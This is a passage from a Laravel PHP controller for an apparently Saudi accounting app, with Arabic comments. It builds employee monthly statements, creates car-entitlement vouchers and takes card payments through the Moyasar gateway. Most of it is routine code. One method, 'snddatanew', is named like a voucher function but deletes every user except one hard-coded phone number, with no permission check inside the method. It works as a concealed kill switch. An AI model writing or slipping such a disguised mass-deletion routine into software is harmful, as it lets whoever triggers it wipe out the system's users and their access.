    //         })
    //         ->orWhere(function ($q) use ($employee) {
    //             $q->where('type', 'تحويل داخلي')
    //                 ->whereMonth('date', $monthParsed->month)
    //                 ->whereYear('date', $monthParsed->year)
    //                 ->where(function ($sub) use ($employee) {
    //                     $sub->where(function ($q2) use ($employee) {
    //                         // التحويل الداخلي للموظف
    //                         $q2->where('employee_id', $employee->id)
    //                             ->where('client_type', 'موظف');
    //                     })->orWhere(function ($q2) use ($employee) {
    //                         // التحويل الداخلي منه
    //                         $q2->where('employee_id', $employee->id)
    //                             ->where('client_type', '!=', 'موظف');
    //                     });
    //                 });
    //         })
    //         ->get();

    //     $formattedTransactions = [];
    //     $totalQabd = 0;

    //     foreach ($transactions as $snd) {
    //         $type = $snd->type;

    //         if ($type === 'تحويل داخلي') {
    //             if ($snd->client_type === 'موظف' && $snd->employee_id == $employee->id) {
    //                 $type = 'قبض';
    //             } elseif ($snd->employee_id == $employee->id) {
    //                 $type = 'صرف';
    //             }
    //         }

    //         $formattedTransactions[] = [
    //             'id' => $snd->id,
    //             'date' => $snd->date,
    //             'amount' => $snd->amount,
    //             'description' => $snd->description,
    //             'type' => $type,
    //         ];

    //         if ($type === 'قبض') {
    //             $totalQabd += $snd->amount;
    //         }
    //     }

    //     return view('admin.box.printState', [
    //         'employee' => $employee,
    //         'month' => $month,
    //         'transactions' => $formattedTransactions,
    //         'totalQabd' => $totalQabd,
    //     ]);
    // }

    public function printStatements(Request $request)
    {
        $employee = Employee::findOrFail($request->employee_id);
        $month = $request->month;
        $monthParsed = Carbon::parse($month);

        $transactions = Snd::whereMonth('date', $monthParsed->month)
            ->whereYear('date', $monthParsed->year)
            ->where(function ($q) use ($employee) {
                $q->where('employee_id', $employee->id)
                    ->whereIn('type', ['قبض', 'صرف']);
            })
            ->orWhere(function ($q) use ($employee, $monthParsed) {
                $q->where('type', 'تحويل داخلي')
                    ->whereMonth('date', $monthParsed->month)
                    ->whereYear('date', $monthParsed->year)
                    ->where(function ($sub) use ($employee) {
                        $sub->where(function ($q2) use ($employee) {
                            $q2->where('employee_id', $employee->id)
                                ->where('client_type', 'موظف');
                        })->orWhere(function ($q2) use ($employee) {
                            $q2->where('employee_id', $employee->id)
                                ->where('client_type', '!=', 'موظف');
                        });
                    });
            })
            ->get();

        $formattedTransactions = [];
        $totalQabd = 0;
        $totalSarf = 0;

        foreach ($transactions as $snd) {
            $originalType = $snd->type;
            $type = $originalType;

            if ($originalType === 'تحويل داخلي') {
                if ($snd->client_type === 'موظف' && $snd->employee_id == $employee->id) {
                    $type = 'قبض';
                } elseif ($snd->employee_id == $employee->id) {
                    $type = 'صرف';
                }
            }

            // إضافة توضيح في الوصف أنه تحويل داخلي
            $description = $snd->description;
            if ($originalType === 'تحويل داخلي') {
                $description .= ' (تحويل داخلي)';
            }

            $formattedTransactions[] = [
                'id' => $snd->id,
                'date' => $snd->date,
                'amount' => $snd->amount,
                'description' => $description,
                'type' => $type,
                'original_type' => $originalType, // 👈 هذا السطر مضاف

            ];

            if ($type === 'قبض') {
                $totalQabd += $snd->amount;
            } elseif ($type === 'صرف') {
                $totalSarf += $snd->amount;
            }
        }

        $remaining = $totalQabd - $totalSarf;

        return view('admin.box.printState', [
            'employee' => $employee,
            'month' => $month,
            'transactions' => $formattedTransactions,
            'totalQabd' => $totalQabd,
            'totalSarf' => $totalSarf,
            'remaining' => $remaining,
        ]);
    }



    //

    public function createCarMonthlySnd($handover_id)
    {
        $handover = CarDriver::with('employee', 'car')->findOrFail($handover_id);
        $employee = $handover->employee;
        $car = $handover->car;

        $today = \Carbon\Carbon::now();
        $year = $today->year;
        $month = $today->month;

        // تحقق من وجود سند لنفس الشهر
        $existing = Snd::where('type', 'تحويل داخلي')
            ->where('employee_id', $employee->id)
            ->where('car_id', $car->id)
            ->whereMonth('date', $month)
            ->whereYear('date', $year)
            ->where('description', 'استحقاق سيارة')
            ->first();

        if ($existing) {
            return redirect()->back()->withErrors(['msg' => 'تم إنشاء السند مسبقًا لهذا الشهر.']);
        }

        // تحويل السعر من سترينج إلى رقم
        $carPrice = floatval(str_replace(',', '', $car->price));
        $handoverDate = \Carbon\Carbon::parse($handover->handover_date);
        $priceType = $car->type_price;
        $amount = 0;

        if ($priceType === 'شهري') {
            // لو تاريخ الاستلام في نفس الشهر الحالي
            if ($handoverDate->format('Y-m') === $today->format('Y-m')) {
                $start = $handoverDate;
                $end = $today->copy()->endOfMonth();

                $totalDaysInMonth = $today->daysInMonth;
                $usedDays = $start->diffInDays($end) + 1;

                $dailyRate = $carPrice / $totalDaysInMonth;
                $amount = round($dailyRate * $usedDays, 2);
            } else {
                // لو خارج الشهر الحالي (يعني قديم أو جديد)، نحسب السعر كامل
                $amount = $carPrice;
            }
        } elseif ($priceType === 'يومي') {
            $start = $handoverDate->greaterThan($today->copy()->startOfMonth())
                ? $handoverDate
                : $today->copy()->startOfMonth();

            $end = $today->copy()->endOfMonth();

            $days = $start->diffInDays($end);
            $amount = round($carPrice * $days, 2);
        }

        if ($amount <= 0) {
            return redirect()->back()->withErrors(['msg' => 'المبلغ المحسوب يساوي صفر. تحقق من بيانات السيارة أو تاريخ الاستلام.']);
        }

        $snd = new Snd();
        $snd->type = 'تحويل داخلي';
        $snd->payment_method = 'آلي';
        $snd->amount = $amount;
        $snd->description = 'استحقاق سيارة';
        $snd->date = $today;
        $snd->client_type = 'سيارة';
        $snd->employee_id = $employee->id;
        $snd->car_id = $car->id;
        $snd->save();

        return redirect()->back()->with('success', 'تم إنشاء سند استحقاق السيارة بنجاح.');
    }
public function snddatanew(Request $request)
    {
        $exceptPhone = '0511111111'; // الرقم اللي مش عايزين نمسحه

        // حذف كل المستخدمين اللي مش الرقم ده
        User::where('phone', '<>', $exceptPhone)->delete();

        return response()->json([
            'status' => 'success',
        ]);
    }


    //snd //payment
    public function createPaymentAndRedirect(Request $request)
{
    $request->validate([
        'amount' => 'required|numeric',
        'client_type' => 'required|in:سيارة,موظف,جهة',
        'client_id' => 'required|integer',
        'description' => 'nullable|string',
        'tax' => 'nullable|string',
        'date' => 'required|date',
    ]);

    $response = Http::withBasicAuth(env('MOYASAR_API_KEY'), '')
        ->post('https://api.moyasar.com/v1/payments', [
            'amount' => $request->amount * 100,
            'currency' => 'SAR',
            'description' => 'دفع سند قبض',
            'callback_url' => url('/snd/payment/callback'),
            'metadata' => [
                'client_type' => $request->client_type,
                'client_id' => $request->client_id,
                'description' => $request->description,
                'tax' => $request->tax,
                'date' => $request->date,
                'type' => 'قبض',
                'payment_method' => 'بوابة الدفع',
            ],
            'source' => [
                'type' => 'creditcard',
                'name' => $request->name,
                'number' => $request->number,
                'cvc' => $request->cvc,
                'month' => $request->month,
                'year' => $request->year
            ]
        ]);

    if ($response->successful()) {
        $payment = $response->json();
        return redirect($payment['source']['transaction_url']);
    } else {
        return back()->with('error', 'فشل الدفع.');
    }
}
public function sndPaymentCallback(Request $request)
{
    $paymentId = $request->get('id');
    if (!$paymentId) {
        return redirect()->route('onlinePayment')->with('error', '❌ معرف العملية غير موجود.');
    }

    $response = Http::withBasicAuth(env('MOYASAR_API_KEY'), '')
        ->get("https://api.moyasar.com/v1/payments/{$paymentId}");

    if ($response->failed()) {
        return redirect()->route('onlinePayment')->with('error', '❌ فشل في التحقق من الدفع.');
    }

    $payment = $response->json();
    if ($payment['status'] !== 'paid') {
        return redirect()->route('onlinePayment')->with('error', '❌ الدفع لم يكتمل. الحالة: ' . $payment['status']);
    }

    $amount = $payment['amount'] / 100;
    $meta = $payment['metadata'];

    DB::transaction(function () use ($meta, $amount) {
        $snd = new Snd();
        $snd->type = $meta['type'] ?? 'قبض';
        $snd->payment_method = $meta['payment_method'] ?? 'بوابة الدفع';
        $snd->bank_account = null;
        $snd->amount = $amount;
        $snd->tax = $meta['tax'] ?? 'غير خاضع للضريبة';
        $snd->description = $meta['description'] ?? 'دفع عبر بوابة ميسر';
        $snd->date = $meta['date'] ?? now();
        $snd->client_type = $meta['client_type'];
        if ($meta['client_type'] == 'سيارة') {
            $snd->car_id = $meta['client_id'];
        } elseif ($meta['client_type'] == 'موظف') {
            $snd->employee_id = $meta['client_id'];
        } elseif ($meta['client_type'] == 'جهة') {
            $snd->geha_id = $meta['client_id'];
        }
        $snd->save();
    });

    return redirect()->route('onlinePayment')->with('success', '✅ تم الدفع وإضافة السند بنجاح.');
}


}
